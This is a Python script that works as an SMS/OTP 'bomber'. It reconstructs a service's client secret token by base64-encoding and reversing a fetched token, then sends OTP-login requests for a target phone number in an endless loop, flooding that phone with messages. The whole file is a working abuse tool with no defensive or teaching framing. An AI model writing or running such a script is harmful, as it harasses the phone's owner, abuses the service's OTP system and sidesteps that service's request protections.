import requests as req
import os
import base64
from dotenv import load_dotenv

load_dotenv()

def verify_number(number):
    try:
        if not number:
            print('Number is required')

        url=f"{os.getenv('BASE_URL')}/user/number/validation/{number}"
        res=req.get(url).json()
        value=dict()
        if res["status_code"]==200:
            value["status"]=res["status"]
        else:
            value["status"]="FAILED"
        
        return value
    
    except Exception as e:
        print(e)


def get_scret_token():
    try:
        url=f"{os.getenv('BASE_URL')}/secret-token"
        res=req.get(url).json()
        value = dict()
        if res["status_code"]==200:
            value=res['data']
        return value
    except Exception as e:
        print(e)


def bomber(phone_number):
    try:
        is_valid = verify_number(phone_number)

        if is_valid["status"] == "SUCCESS":
            res = get_scret_token()

            code = res['secret_code']
            token = res['_token']

            encoded = token.encode("ascii")
            base64_token = (base64.b64encode(encoded)).decode('utf-8')
            reversed_token_bytes = base64_token[::-1]
            client_secret_token = f"{code}={reversed_token_bytes}"

            url = f"{os.getenv('BASE_URL')}/user/otp-login/request"
            payload = {'mobile':phone_number}
            headers= {'client_secret_token':client_secret_token}

            response = req.post(url,headers=headers,json=payload).json()

            if response['status_code'] == 200:
                print('Bombered successfully')

    except Exception as e:
        print(e)


def start_bombing(number):
    try:
        while True:
            bomber(number)
    
    except Exception as e:
        print(e)